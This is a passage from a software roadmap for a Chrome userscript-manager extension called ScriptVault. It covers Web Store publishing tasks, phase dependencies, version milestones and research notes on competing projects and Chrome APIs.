- Source: [Publishing to external organizations (Feb 20 2026)](https://developer.chrome.com/blog/cws-new-enterprise-publishing-option).

### 37.2 CWS Publisher Roles

CWS dashboard now supports inviting members directly into the publisher account with one of four roles ([blog post, April 30 2026](https://developer.chrome.com/blog/cws-role-expansion-developer-dashboard)) — no more shared Google Group, no $5 fee for invitees.

- Document the roles in `CONTRIBUTING.md` so co-maintainers know which one to request.
- Tag the public release-management runbook with role minimums for: tagging a release (Developer), uploading a CRX (Publisher), responding to a CWS appeal (Owner).
- Source: [Empower your team with extension roles (April 30 2026)](https://developer.chrome.com/blog/cws-role-expansion-developer-dashboard).

### 37.3 Streamlined CWS Appeals Workflow

The CWS [smarter & faster appeals process (April 8 2026)](https://developer.chrome.com/blog/cws-new-appeals-process) lets developers appeal policy enforcement directly through the publisher dashboard.

- Add a section to `docs/cws-takedown-recovery.md` describing the new flow, with the canned response language ScriptVault would use for the most likely false-positive flag (`scripting` permission misuse — userscript managers historically eat false-positives because the entire premise is "execute arbitrary user code").
- Source: [Smarter & faster appeals (April 8 2026)](https://developer.chrome.com/blog/cws-new-appeals-process).

### 37.4 Cross-Extension Messaging Compatibility Matrix

Chrome 148 enforces matching serialization formats — JSON-mode and structured-clone-mode extensions cannot directly exchange `runtime.sendMessage`/`runtime.connect` payloads. Once ScriptVault opts into structured-clone (Phase 36.1), every extension that talks to it must be audited.

- Inventory every `externally_connectable` consumer ScriptVault talks to today and the planned vscode.dev companion (Phase 12.14): each must either also opt into structured clone or proxy through a JSON-only bridge.
- Document the matrix in `docs/extension-interop.md`: rows = external extensions, columns = serialization format, cell = success/blocked/proxied.
- Decide cutover policy: stay on JSON until vscode.dev companion ships and is itself on structured-clone.
- Source: [Structured Clone Messaging — Extension-to-extension communication](https://developer.chrome.com/blog/structured-clone-messaging).
- **Status:** ✅ Shipped in v3.9.0 (matrix). [`docs/extension-interop.md`](docs/extension-interop.md) inventories all messaging surfaces, confirms ScriptVault is closed-loop today (no `externally_connectable`, no `onMessageExternal`), defines the cutover policy for the vscode.dev companion (Phase 12.14), and lists the audit checklist that must run before any Phase 36.x messaging PR. Gate for Phase 36.1 is now green.

### 37.5 Extensions Update Lifecycle Documentation

Chrome published an [update-lifecycle guide (Sept 9 2025)](https://developer.chrome.com/docs/extensions/develop/concepts/extensions-update-lifecycle) clarifying when extensions check for updates, how `update_url` overrides interact with CWS auto-update, and the consequences of upload-vs-publish timing.

- Cross-reference Phase 6 (update system) against the new guide; ensure ScriptVault's auto-update language doesn't claim behaviour Chrome's update mechanism contradicts.
- Update README "How updates work" to link to the official lifecycle page.
- Source: [Extensions update lifecycle](https://developer.chrome.com/docs/extensions/develop/concepts/extensions-update-lifecycle).

### 37.6 `Tab.frozen` Property & Frozen-Tab Message Queueing

Chrome 132+ exposes `Tab.frozen`. Messages sent to frozen tabs are now queued and delivered after thaw. ScriptVault's tab-event handlers and badge updaters never inspect this — they treat frozen tabs the same as live ones, which can produce stale stats.

- Audit every `chrome.tabs.query`/`chrome.tabs.onUpdated` consumer; skip stats decrement and badge-count updates when `tab.frozen === true`.
- `getScriptsForTab` returns the cached match set when `tab.frozen` is true rather than re-evaluating against a stale URL.
- Source: [Chrome 132 — Tab.frozen](https://developer.chrome.com/docs/extensions/whats-new#chrome_132_new_frozen_property_in_the_tabs_api).

**Exit criteria:** publish.sh supports `--enterprise <org-id>`; CONTRIBUTING.md documents CWS publisher roles; takedown-recovery runbook references the new appeals flow; interop matrix written and reviewed before Phase 36.1 ships; README update-lifecycle section links the official guide; tab handlers gate on `tab.frozen` for stats and match-resolution paths.

---

## Phase Summary & Dependencies

```
Phase 0 ─── Foundation (Node.js, Monaco, CI)
  │
Phase 1 ─── TypeScript Migration
  │
  ├── Phase 2 ─── Storage Rewrite (IndexedDB)
  │     │
  │     ├── Phase 3 ─── Service Worker Resilience
  │     │
  │     └── Phase 8 ─── Sync & Backup Rewrite
  │           │
  │           └── Phase 9 ─── Migration System
  │
  ├── Phase 4 ─── URL Matcher Rewrite
  │
  ├── Phase 5 ─── Security Hardening
  │
  ├── Phase 6 ─── Update System Overhaul
  │
  └── Phase 7 ─── Dashboard UX

Phase 10 ─── Testing (runs in parallel, grows with each phase)

Phase 11 ─── GM API Parity (Phase 11.9 needs Phase 2 for storage.session; rest independent)
Phase 12 ─── UX Polish (12.13 Trash needs Phase 2; 12.14 vscode.dev needs Phase 1; rest independent)
Phase 13 ─── Platform Modernization (13.7 Git sync needs Phase 8; rest can start now)
Phase 14 ─── Accessibility & i18n (fully independent, can start now)

Phase 15 ─── Editor & Dev UX (15.2 auto-grant uses existing Acorn; 15.3+15.4 need Phase 2 + Phase 13.4; 15.6 adds wasm-unsafe-eval CSP; rest need Phase 13.4 Monaco upgrade)
Phase 16 ─── Advanced XHR (builds on Phase 11.5 XHR; 16.3 streaming needs long-lived port; rest independent)
Phase 17 ─── Security Round 2 (17.1 needs Phase 2 session storage; 17.7 GM_addStyle needs Phase 11; rest independent)
Phase 18 ─── Performance (18.1 needs Phase 1 TS migration; 18.2 needs Phase 2; rest independent)

Phase 19 ─── Distribution & CWS Compliance (fully independent; builds on prior phases but can run in parallel as long-tail work)
Phase 20 ─── Observability & Debugging (20.1-20.5 build on prior phases' logging; 20.2 needs Phase 15.6; mostly independent)
Phase 21 ─── Extended Sync Backends (21.1-21.2 independent; 21.3 builds on Phase 8; 21.4-21.6 independent)
Phase 22 ─── Community Standards (22.1-22.8 independent; 22.4 references Phase 5/17 security; purely spec/standard alignment)
```

### Suggested Execution Order
1. **Phase 0** — Unblocks everything
2. **Phase 1** (waves 1-3) — TypeScript for modules and background
3. **Phase 4** — URL matcher (high bug density, self-contained)
4. **Phase 2** — Storage rewrite (enables phases 3, 8, 9, and parts of 11/12)
5. **Phase 5** — Security (can run partially in parallel with 2)
6. **Phase 3** — Service worker resilience (depends on Phase 2)
7. **Phase 1** (waves 4-5) — TypeScript for pages/dashboard
8. **Phase 7** — Dashboard UX (depends on TypeScript pages)
9. **Phase 6** — Update system (depends on storage rewrite)
10. **Phase 8** — Sync rewrite (depends on storage rewrite)
11. **Phase 9** — Migration system (depends on storage rewrite)
12. **Phase 10** — Testing (continuous, ramps up each phase)
13. **Phase 11** — GM API Parity (can run alongside phases 4–10 for self-contained items)
14. **Phase 12** — UX Polish (can run alongside phases 7–10; 12.13 after Phase 2)
15. **Phase 13** — Platform Modernization (13.9–13.11 can start now; 13.7 after Phase 8)
16. **Phase 14** — Accessibility & i18n (can start anytime; fully independent)
17. **Phase 15** — Editor & Dev UX (15.1–15.2 can start after Phase 13.4; 15.3 after Phase 2; 15.6 independent)
18. **Phase 16** — Advanced XHR (can run alongside Phase 11; 16.3 streaming after Phase 11.5)
19. **Phase 17** — Security Round 2 (17.1 after Phase 2; 17.3 after Phase 6; rest independent)
20. **Phase 18** — Performance (18.1 after Phase 1; 18.2 after Phase 2; 18.3–18.10 can start anytime)
21. **Phase 19** — Distribution & CWS (can run in parallel with Phases 13–18; long-tail ops work)
22. **Phase 20** — Observability & Debugging (20.2 after Phase 15.6; rest alongside Phases 18–19)
23. **Phase 21** — Extended Sync (21.3 after Phase 8; rest alongside Phases 18–20)
24. **Phase 22** — Community Standards (can run final phase; end-to-end standard alignment)
25. **Phase 23** — Offline-First & Resilient Sync (23.1–23.5 depend on Phase 2; can run alongside Phase 24–26)
26. **Phase 24** — Script Discovery & Recommendations (24.1–24.6 independent; can run parallel with Phase 23–28)
27. **Phase 25** — Enterprise Deployment & Profiling (25.1–25.6 independent; run alongside Phase 24–28)
28. **Phase 26** — WebAssembly & Advanced Matching (26.3 needs Phase 22 URLPattern; rest independent)
29. **Phase 27** — Author Tooling Ecosystem (27.1–27.6 independent; long-tail developer experience)
30. **Phase 28** — Community Security & Transparency (28.1–28.6 cap roadmap; reputation/audit/CVE databases)
31. **Phase 29** — Mobile PWA & Cross-Device Sync (29.1–29.3 independent; 29.4 needs Phase 23 sync; can run alongside Phases 30–32)
32. **Phase 30** — Advanced Caching & Performance (30.1–30.6 independent; optimization pass; run alongside Phases 29–32)
33. **Phase 31** — Community Platform & Governance (31.1–31.6 independent; long-tail engagement work)
34. **Phase 32** — Emerging Standards & Next-Gen Architectures (32.1–32.6 research + future-proofing)
35. **Phase 33** — Cross-Browser Support (33.1 WXT pipeline first; 33.2 Firefox after; 33.4 Edge in parallel; 33.7 Safari deferred behind decision gate)
36. **Phase 34** — Deep Accessibility & Author Education (34.1–34.6 incremental a11y improvements; 34.7 docs site can run anytime; 34.10 i18n after Phase 14)
37. **Phase 35** — Federation & Decentralization (35.1 IPFS + 35.3 did:key are zero-dep; 35.2 Nostr after Phase 24; 35.5 registry spec after Phase 25.2)
38. **Phase 36** — Local-Model Authoring & Modern Platform APIs (36.1 structured-clone messaging needs Phase 37.4 interop matrix first; 36.2 Prompt API depends on Phase 14 settings groups; 36.4-36.7 + 36.11 + 36.14 are zero-dep parser/UI work; 36.10 needs Phase 3 SW-wake hooks; 36.13 needs Phase 2 IDB; 36.12 slots into Phase 13 scheduler)
39. **Phase 37** — Enterprise Distribution & CWS Compliance Round 2 (37.4 interop matrix gates Phase 36.1; 37.1-37.3 + 37.5 are documentation-only; 37.6 `tab.frozen` is a 30-min gate-check across existing tab handlers)

| Phase | Version | Milestone |
|-------|---------|-----------|
| 0     | v2.1.0  | Dev environment, Monaco local, CI |
| 1.1-1.3 | v2.2.0 | TypeScript modules |
| 4     | v2.3.0  | Unified URL matcher |
| 2     | v3.0.0  | IndexedDB storage (breaking migration) |
| 5     | v3.1.0  | Security hardening |
| 3     | v3.2.0  | Service worker resilience |
| 1.4-1.5 | v3.3.0 | TypeScript pages + new build |
| 7     | v3.4.0  | Dashboard UX |
| 6     | v3.5.0  | Update system |
| 8     | v3.6.0  | Sync rewrite |
| 9     | v3.7.0  | Migration framework |
| 10    | v4.0.0  | Full test suite, production-ready |
| 11    | v4.1.0  | GM API parity + metadata directives |
| 12    | v4.2.0  | UX polish + vscode.dev + per-site toggles |
| 13    | v4.3.0  | Platform modernization + CWS signing |
| 14    | v4.4.0  | WCAG 2.2 + i18n groundwork |
| 15    | v4.5.0  | Editor DX: IntelliSense, auto-grant, version history, diff view |
| 16    | v4.6.0  | GM_fetch, AbortController, streaming XHR, CHIPS, OpenUserJS |
| 17    | v4.7.0  | Security Round 2: integrity hash, audit log, update consent |
| 18    | v4.8.0  | Performance: module split, OPFS, scheduler, Sanitizer API |
| 19    | v4.9.0  | Multi-store distribution: Edge, CWS compliance, TM/VM compat |
| 20    | v5.0.0  | Observability milestone: per-script execution tracing, errors, network log |
| 21    | v5.1.0  | Extended sync: GitHub Gist, S3, client-side encryption, privacy hardening |
| 22    | v5.2.0  | Community standards: GREASE, URLPattern, @require-local, ESM import maps |
| 23    | v5.3.0  | Offline-first: local caching, conflict-free sync, resilience |
| 24    | v5.4.0  | Discovery: GreasyFork/OpenUserJS browser, health indicators, recommendations |
| 25    | v5.5.0  | Enterprise: admin console, internal repos, allowlist/denylist, audit logs |
| 26    | v5.6.0  | WebAssembly: @require-wasm, URLPattern migration, advanced @match, frame-aware |
| 27    | v5.7.0  | Author tooling: eslint-plugin, test-runner, doc-gen, header validator |
| 28    | v5.8.0  | Community security: peer review, malware detection, CVE tracking, transparency |
| 29    | v5.9.0  | Mobile PWA: iOS/Android installability, Yjs CRDT sync, cross-device support |
| 30    | v6.0.0  | Performance: HTTP caching, SWR, code-splitting, monorepo optimization milestone |
| 31    | v6.1.0  | Community platform: Discourse forum, reputation system, governance + transparency |
| 32    | v6.2.0  | Emerging standards: WASM components, abx-spec portability, import maps, model-assisted debugging |
| 33    | v6.3.0  | Cross-browser: WXT pipeline, Firefox MV3, Edge store, Brave/Vivaldi/Opera/Arc, Orion, Safari (deferred) |
| 34    | v6.4.0  | Deep a11y: Monaco screen reader, voice control, forced-colors, ICU plurals, RTL, docs site, axe CI |
| 35    | v6.5.0  | Federation: IPFS CID fallback, Nostr discovery, did:key signing, ActivityPub, self-hosted registry spec |



## Open-Source Research (Round 2)

### Related OSS Projects
- **Violentmonkey** — https://github.com/violentmonkey/violentmonkey — GPLv3 userscript manager; automatic updates, execute-in-order, GM functions, zip import/export, cloud sync (Dropbox/OneDrive/GDrive/WebDAV); strong MV2-era reference (MV3 not yet shipped)
- **ScriptCat** — https://github.com/scriptscat/scriptcat — GPLv3 userscript manager with full MV3 support; background script engine, subscription system
- **Tampermonkey** — https://github.com/Tampermonkey/tampermonkey — GPLv3-published source; widest API coverage (GM_webRequest, GM_cookie) — useful as a compatibility reference
- **Userscripts (Safari)** — https://github.com/quoid/userscripts — Safari/iOS open-source manager; very minimal, good pattern for lean UIs
- **GreasyFork** — https://github.com/JasonBarnabe/greasyfork — script-hosting platform source; useful for integrating a "Browse GreasyFork" tab inside ScriptVault
- **vite-plugin-monkey** — https://github.com/lisonge/vite-plugin-monkey — Vite plugin for building userscripts compatible with all managers; inspiration for an in-editor build step
- **awesome-userscripts** — https://github.com/awesome-scripts/awesome-userscripts — curated index; integrate as a discovery catalog

### Features to Borrow
- Cloud sync across Dropbox/OneDrive/GDrive/WebDAV with conflict resolution (Violentmonkey)
- Script subscription/feed: follow a URL that publishes a list of scripts and auto-pull updates (ScriptCat)
- GM_webRequest / GM_cookie / GM_xmlHttpRequest anonymous mode parity checklist (Tampermonkey API surface)
- "Execute in specified order" with drag-sortable priority per @match pattern (Violentmonkey)
- Zip import/export that round-trips with Tampermonkey's native format (Violentmonkey)
- Storage editor: edit values.* GM_setValue store directly with JSON tree view (Violentmonkey)
- CSP-page injection fallback that uses declarativeNetRequest rule to strip CSP for matched domains (Violentmonkey)
- Per-script resource/cache tab so users can inspect @resource downloads and their hashes (Tampermonkey)
- Browse GreasyFork / OpenUserJS from inside the manager with one-click install (Tampermonkey has it)
- Vite-plugin-monkey-style bundler integrated into the Monaco editor: type TypeScript, compile on save (vite-plugin-monkey)
- "Dry-run" script execution in an isolated test page with network-mock to debug without side effects

### Patterns & Architectures Worth Studying
- MV3 service-worker + offscreen-document pattern for long-lived GM_xmlHttpRequest handlers without losing state on SW termination (ScriptCat)
- Compilation-step architecture: write modern TS, transpile to IIFE userscript at install time (ScriptCat, vite-plugin-monkey)
- Sync-conflict resolver pattern: last-modified per field rather than per document, so cloud edits don't clobber local toggle flips (Violentmonkey)
- Subscription/feed model: userscripts as RSS-like feeds, manager polls for updates (ScriptCat) — cleaner than the Tampermonkey @updateURL-per-script approach
- Isolated-world MAIN-world dual-injection with a typed postMessage bridge (Violentmonkey source has a clean implementation to mirror)

## Implementation Deep Dive (Round 3)

### Reference Implementations to Study
- **Tampermonkey/tampermonkey / src/background.js** — https://github.com/Tampermonkey/tampermonkey — reference for the GM_* API surface, `@match` compilation, and cross-context message routing; ground truth for compatibility.
- **Tampermonkey/tampermonkey-editors** — https://github.com/Tampermonkey/tampermonkey-editors — Monaco-on-vscode.dev integration pattern via `externalExtensionIds` + `chrome.runtime.onMessageExternal`; useful for a future "edit in vscode.dev" feature.
- **violentmonkey/violentmonkey / src/background/** — https://github.com/violentmonkey/violentmonkey — MV3-first userscript manager; cleanest example of `chrome.userScripts` API (Chrome 120+) vs. our `chrome.scripting.executeScript` fallback.
- **microsoft/monaco-editor / samples/browser-esm-webpack/** — https://github.com/microsoft/monaco-editor/tree/main/samples — correct web-worker config for MV3 (workers must be bundled, not fetched from CDN).
- **openuserjs/OpenUserJS.org** — https://github.com/OpenUserJS/OpenUserJS.org — script hosting metadata schema; informs our manifest parser.
- **greasemonkey/greasemonkey / src/bg/api-provider-source.js** — historical GM_* polyfill reference if we need to cover pre-WebExtensions APIs.
- **orangishcat/page-proxy (DEV writeup)** — https://dev.to/orangishcat/i-built-a-gui-powered-userscript-manager-for-faster-userscript-creation-ebb — lessons learned bundling Monaco into an MV3 extension, including the ~few-MB size tradeoff and IntelliSense type-stub injection.

### Known Pitfalls from Similar Projects
- **SW lifecycle kills long-running scripts** — MV3 service worker idles after 30s; Tampermonkey works around with `chrome.alarms` heartbeats. See: https://github.com/Tampermonkey/tampermonkey/issues (SW lifecycle threads).
- **`eval`/`Function()` banned under MV3 CSP** — userscripts using `unsafeWindow` or evaluating strings need `world:"MAIN"` content scripts, not extension-world eval. Reference: https://github.com/violentmonkey/violentmonkey
- **Monaco web-worker CSP** — loading Monaco's workers from a blob URL fails on CSP-strict hosts; workers must be declared in manifest's `web_accessible_resources` and loaded by relative URL.
- **`@require` external fetch under MV3** — remotely fetched JS can't be `eval`'d; cache and inject via `chrome.scripting.executeScript({ files:[...] })` into `world:"MAIN"`.
- **`GM_xmlhttpRequest` cross-origin** — extension has host perms but script's origin doesn't; must proxy via background. TM implements this; we should match that shape to stay drop-in compatible.
- **Persistence of editor state** — Monaco models > 5MB blow past `chrome.storage.local`; use IndexedDB. See: https://github.com/microsoft/monaco-editor/issues
- **Unsandboxed `eval` risk** — if we ever run user scripts in the extension world, a malicious script can call `chrome.*`. Always `world:"MAIN"`.

### Library Integration Checklist
- **monaco-editor** pin `>=0.48.0`; entrypoint `monaco.editor.create`; gotcha: ship workers bundled (editor, ts, json, css, html) via `MonacoEnvironment.getWorkerUrl`, not CDN.
- **chrome.userScripts API** (Chrome 120+); entrypoint `chrome.userScripts.register`; gotcha: requires `"userScripts"` permission + user-enabled developer mode (Chrome 138 dialog).
- **chrome.scripting.executeScript** fallback; entrypoint standard; gotcha: `world:"MAIN"` needed for `@match`-style scripts; `"ISOLATED"` for extension-API bridges.
- **vitest** pin `>=2.0`; entrypoint `vitest run`; gotcha: needs `@vitest/web-worker` for Monaco worker mocks.
- **esbuild** pin `>=0.25.0`; gotcha: set `target:"chrome120"` to match MV3 baseline so class fields/top-level-await ship unshimmed.
- **idb** (IndexedDB wrapper) pin `>=8.x`; entrypoint `openDB`; gotcha: SW can't hold DB handles across restarts — reopen per operation.
- **@types/greasemonkey** pin latest; provides GM_* typings for the editor's IntelliSense.

## External Research (Round 4)

_Added after agent-based competitive and platform research sweep (June 2025). Sources are numbered to facilitate the gap analysis appendix below._

### Source Index

**Competitor APIs and Documentation**
1. https://docs.scriptcat.org/docs/dev/api/ — ScriptCat full GM API reference (v0.17.x)
2. https://docs.scriptcat.org/docs/dev/background/ — ScriptCat background script architecture
3. https://docs.scriptcat.org/docs/dev/cat-api/ — ScriptCat CAT_ unique API extensions
4. https://docs.scriptcat.org/docs/dev/meta/#storagename — ScriptCat `@storageName` metadata
5. https://violentmonkey.github.io/api/gm/ — Violentmonkey GM_ function reference
6. https://violentmonkey.github.io/api/metadata-block/ — Violentmonkey metadata block spec
7. https://www.tampermonkey.net/changelog.php — Tampermonkey changelog (recent releases)
8. https://github.com/quoid/userscripts — Userscripts (Safari) README and metadata docs
9. https://github.com/Tampermonkey/tampermonkey-editors — TM vscode.dev companion extension
10. https://github.com/lisonge/vite-plugin-monkey — vite-plugin-monkey README (auto-grant, ESM, HMR)
11. https://github.com/kusoidev/ScriptFlow — ScriptFlow multi-file userscript IDE (community)

**Chrome Extension Platform**
12. https://developer.chrome.com/docs/extensions/whats-new — Chrome Extensions What's New (Chrome 120–148)
13. https://developer.chrome.com/docs/extensions/reference/api/userScripts — userScripts API reference
14. https://developer.chrome.com/docs/extensions/reference/api/storage — chrome.storage API reference
15. https://developer.chrome.com/docs/extensions/reference/api/offscreen — chrome.offscreen API reference
16. https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle — SW lifecycle
17. https://developer.chrome.com/blog/extension-news-june-2025 — CWS signing, --load-extension removal
18. https://developer.chrome.com/blog/structured-clone-messaging — Chrome 148 structured clone opt-in
19. https://developer.chrome.com/blog/chrome-userscript — Chrome 138 Allow User Scripts toggle
20. https://developer.chrome.com/docs/webstore/program-policies/ — CWS developer program policies
21. https://extensionworkshop.com/documentation/develop/manifest-v3-migration-guide/ — Firefox MV3 guide

**GitHub Issue Trackers**
22. https://github.com/violentmonkey/violentmonkey/issues/2464 — Fuzzy/ranked search
23. https://github.com/violentmonkey/violentmonkey/issues/2425 — Direct GF publish + browser
24. https://github.com/violentmonkey/violentmonkey/issues/2419 — `@require-local` local dependencies
25. https://github.com/violentmonkey/violentmonkey/issues/2410 — Per-site enable/disable toggle
26. https://github.com/violentmonkey/violentmonkey/issues/2365 — Enterprise policy deployment
27. https://github.com/violentmonkey/violentmonkey/issues/2359 — GM_xmlhttpRequest redirect control
28. https://github.com/violentmonkey/violentmonkey/issues/2342 — `@top-level-await` as default
29. https://github.com/violentmonkey/violentmonkey/issues/2287 — Script list grouping/folding
30. https://github.com/violentmonkey/violentmonkey/issues/2263 — Runtime permission diagnostics
31. https://github.com/violentmonkey/violentmonkey/issues/2219 — Collapsible popup command groups
32. https://github.com/violentmonkey/violentmonkey/issues/2176 — Local filesystem sync
33. https://github.com/violentmonkey/violentmonkey/issues/2168 — GM_xmlhttpRequest nocache
34. https://github.com/violentmonkey/violentmonkey/issues/2144 — Recycle bin / undo delete
35. https://github.com/violentmonkey/violentmonkey/issues/2125 — Local filesystem directory sync
36. https://github.com/violentmonkey/violentmonkey/issues/2100 — CHIPS cookie partition in XHR
37. https://github.com/violentmonkey/violentmonkey/issues/2048 — SPA-aware popup / `@match-active`
38. https://github.com/violentmonkey/violentmonkey/issues/1994 — vscode.dev integration (17 comments)
39. https://github.com/violentmonkey/violentmonkey/issues/1982 — GM_registerMenuCommand accessKey

**Standards and Specifications**
40. https://www.w3.org/WAI/standards-guidelines/wcag/new-in-22/ — WCAG 2.2 new criteria
41. https://wiki.greasespot.net/Metadata_Block — Greasemonkey metadata spec (canonical)
42. https://greasyfork.org/en/help/api — GreasyFork JSON API + prefill endpoint
43. https://github.com/WICG/navigation-api — Navigation API spec (Chrome 102)

**Community Signal**
44. https://news.ycombinator.com/item?id=42337605 — Launch HN: Tweeks (YC W25) — 351pts/213 comments
45. https://github.com/advisories?query=userscript — GitHub Advisory Database (4 advisories)
46. https://github.com/awesome-scripts/awesome-userscripts — Awesome Userscripts landscape index

### Chrome Platform API Timeline (Chrome 120–148)

| Version | API Change | ScriptVault Impact |
|---------|-----------|-------------------|
| Chrome 120 | `userScripts` API launched; `chrome.alarms` min interval 30s | Baseline; alarms can now cover 30–60s tasks |
| Chrome 130 | `StorageArea.getKeys()` across all storage areas | Phase 13.11 |
| Chrome 132 | `tabs.Tab.frozen` boolean; `permissions.addHostAccessRequest()` | Phase 12.12, 13.9 |
| Chrome 133 | `worldId` on `RegisteredUserScript` for per-script isolation | Phase 13 architecture note |
| Chrome 135 | `userScripts.execute()` one-shot injection | Phase 11.4 |
| Chrome 137 | `--load-extension` CLI flag removed | Phase 13.6 |
| Chrome 138 | "Allow User Scripts" per-extension toggle | Phase 13.3 |
| Chrome 140 | `sidePanel.getLayout()` | Phase 13.2 |
| Chrome 148 | Structured clone messaging opt-in | Phase 13.1 |

### Key Competitive Feature Gaps (Summary)

Confirmed absent from ScriptVault based on API docs and issue tracker analysis:

- `GM_cookie` — present in TM and ScriptCat; absent from VM intentionally; high demand [sources 1, 7]
- `GM_getTab/saveTab/getTabs` — present in TM, ScriptCat, Userscripts Safari [sources 1, 8]
- `@inject-into` — present in VM and Userscripts Safari; affects world selection [source 6]
- `@connect` enforcement — TM parses; VM does not; affects XHR sandboxing [source 41]
- `@require` SRI — TM supports; others do not; supply-chain security gap [source 7]
- `@run-at navigation` — nobody has it; highest SPA pain point in community [sources 37, 43]
- Per-site enable/disable — nobody has it; VM issue open since 2024 [source 25]
- vscode.dev integration — TM has companion extension; nobody else [source 9]
- Runtime permission diagnostics — VM issue open; major usability gap [source 30]
- CWS verified CRX signing — new June 2025; no manager has adopted yet [source 17]
- `GM_fetch` — FireMonkey (Firefox) has it; no Chrome manager does; TM #1050 closed without implementation [source 55, 56]
- AbortController signal in GM_xmlhttpRequest — no manager supports `signal?`; all use separate `.abort()` [source 58]
- Script version history + rollback — no manager has this; VM #1391 confirms the data-loss pain [source 60]
- GM_* IntelliSense in built-in editor — `@types/tampermonkey` exists but no manager injects it into their editor [source 47]
- In-browser TypeScript transpilation — no manager or open-source userscript IDE has it [source 48]
- Auto-grant inference (live editor) — vite-plugin-monkey does it at build time; no manager editor does it live [source 49]
- Diff view on update — TM has basic text diff; VM is the most-requested missing feature (#500, 80+ upvotes) [source 73]

## External Research (Round 5)

_Added after second agent-based sweep (May 2026). Sources numbered 47–96 to extend Round 4's index._

### Source Index

**Type Definitions & Build Tools**
47. https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/tampermonkey/index.d.ts — `@types/tampermonkey` (45KB, full GM_* API surface, cookiePartition, stream responseType)
48. https://esbuild.github.io/api/#browser — esbuild-wasm browser usage + wasm-unsafe-eval CSP requirement
49. https://github.com/lisonge/vite-plugin-monkey/blob/main/packages/vite-plugin-monkey/src/node/utils/grant.ts — auto-grant inference AST walk implementation
50. https://github.com/lisonge/vite-plugin-monkey/blob/main/packages/vite-plugin-monkey/src/node/utils/gmApi.ts — 28 tracked GM identifiers for auto-grant
51. https://github.com/kusoidev/ScriptFlow — ScriptFlow: multi-file IDE with 5 templates, PiP sandbox, File System Access API live reload
52. https://github.com/microsoft/monaco-editor/blob/main/CHANGELOG.md — Monaco 0.53–0.55.1 changelog (AMD removal, native LSP, namespace rename)
53. https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/greasemonkey — @types/greasemonkey (GM4 Promise API + v3 subdirectory)

**GM API References**
54. https://violentmonkey.github.io/api/gm/ — VM GM_ function reference (responseType options, anonymous, abort control)
55. https://github.com/erosman/support/issues/98 — FireMonkey `GM_fetch` implementation confirmed (Firefox extension)
56. https://github.com/Tampermonkey/tampermonkey/issues/1050 — TM GM_fetch / Response object proposal (closed as duplicate 2025-04-13)
57. https://www.tampermonkey.net/documentation.php — TM docs: GM_webRequest not available in MV3 (v5.2+)
58. https://github.com/Tampermonkey/tampermonkey/issues/644 — TM GM_webRequest dropped from MV3 branch
59. https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/tampermonkey/index.d.ts#L97-L106 — stream responseType caveats (no abort/timeout/progress in fetch mode)

**GitHub Issue Trackers (Round 5)**
60. https://github.com/violentmonkey/violentmonkey/issues/1391 — VM data loss with no rollback (zero recovery path)
61. https://github.com/violentmonkey/violentmonkey/issues/2118 — VM set-cookie response header filtering breaks SSO flows
62. https://github.com/Tampermonkey/tampermonkey/issues/723 — TM @require-nocache for local development
63. https://github.com/violentmonkey/violentmonkey/issues/2100 — VM CHIPS partitioned cookies break GM.xhr (Cloudflare 403)
64. https://github.com/Tampermonkey/tampermonkey/issues/1483 — TM GM_wsConnectTo WebSocket bypass proposal
65. https://github.com/Tampermonkey/tampermonkey/issues/2703 — TM CLI/API for programmatic script management (developer appetite)
66. https://github.com/Tampermonkey/tampermonkey/issues/2613 — TM install flow UX scrutiny
67. https://github.com/OpenUserJS/OpenUserJS.org — OpenUserJS source; install URL format; no public REST API
68. https://github.com/greasemonkey/greasemonkey — Greasemonkey 4.x (maintenance mode, last real code Feb 2025)
69. https://github.com/advisories?query=tampermonkey — GitHub Advisory Database: 0 CVEs for TM or VM
70. https://github.com/violentmonkey/violentmonkey/issues/500 — VM diff view on update (#1 most-reacted enhancement, 80+ upvotes)
71. https://github.com/violentmonkey/violentmonkey/issues/1934 — VM MV3 migration status (occupied with infra, not features)
72. https://github.com/google/diff-match-patch — diff-match-patch (Google): delta compression for version history (6KB gzipped)
73. https://github.com/violentmonkey/violentmonkey/issues/500 — Diff view before update (see also source 70)
74. https://github.com/violentmonkey/violentmonkey/issues/1023 — VM decouple check-for-update from auto-install (#2 most-painful behavior)

**Adjacent OSS Projects**
75. https://stackoverflow.com/questions/tagged/tampermonkey — Top SO questions: chrome:// blocking, @connect errors, execution timing
76. https://github.com/openstyles/stylus — Stylus CSS manager (MV3, IndexedDB, WebDAV, revision-based sync conflict resolution)
77. https://github.com/openstyles/stylus/blob/master/src/background/sync-manager.js — Stylus sync: 30min interval, 1min debounce, monotonic _rev conflict resolution
78. https://github.com/openstyles/stylus/blob/master/src/background/db.js — Stylus dual-mode IDB/chrome.storage, gzip mirror in CacheStorage API
79. https://chromewebstore.google.com/detail/orangemonkey/ekmeppjgajofkpiofbebgcbohbmfldaf — OrangeMonkey (VM fork, v2.0.14 Mar 2026, closed-source, ZIP backup feature)
80. https://github.com/Tampermonkey/tampermonkey/issues?q=GM_addStyle+shadow+OR+timing+OR+remove+OR+replace — TM GM_addStyle issues: #2671 (remove/replace "not planned")

**ScriptCat v1.x**
81. https://github.com/scriptscat/scriptcat/releases/tag/v1.3.0 — ScriptCat v1.3.0: Amazon S3 sync, GM_addElement content fix, GM API async corrections
82. https://github.com/scriptscat/scriptcat/releases/tag/v1.4.0-beta.1 — ScriptCat v1.4.0-beta: hosted assistant system, @unwrap, window.onurlchange
83. https://docs.scriptcat.org/en/docs/dev/api/ — ScriptCat GM_setValues/getValues/deleteValues bulk APIs, GM_log with levels
84. https://docs.scriptcat.org/en/docs/change/ — ScriptCat full changelog

**Chrome Platform APIs (Round 5)**
85. https://developer.chrome.com/blog/chrome-148-beta — Chrome 148: SharedWorker extendedLifetime, structured clone, Web Serial on Android
86. https://developer.chrome.com/blog/chrome-146-beta — Chrome 146: Sanitizer API (Element.setHTML, Document.parseHTML)
87. https://developer.chrome.com/blog/chrome-147-beta — Chrome 147: scoped View Transitions (Element.startViewTransition), CSSPseudoElement
88. https://chromestatus.com/api/v0/features?milestone=149 — Chrome 149 features (CSS gap decorations, BFCache WebSocket disconnect, OpaqueRange)
89. https://chromestatus.com/api/v0/features?milestone=150 — Chrome 150 features (CSS URL integrity, AccentColor, text-fit)
90. https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle — SW lifecycle: keepalive via WebSocket (116+), port (114+), API call timer reset
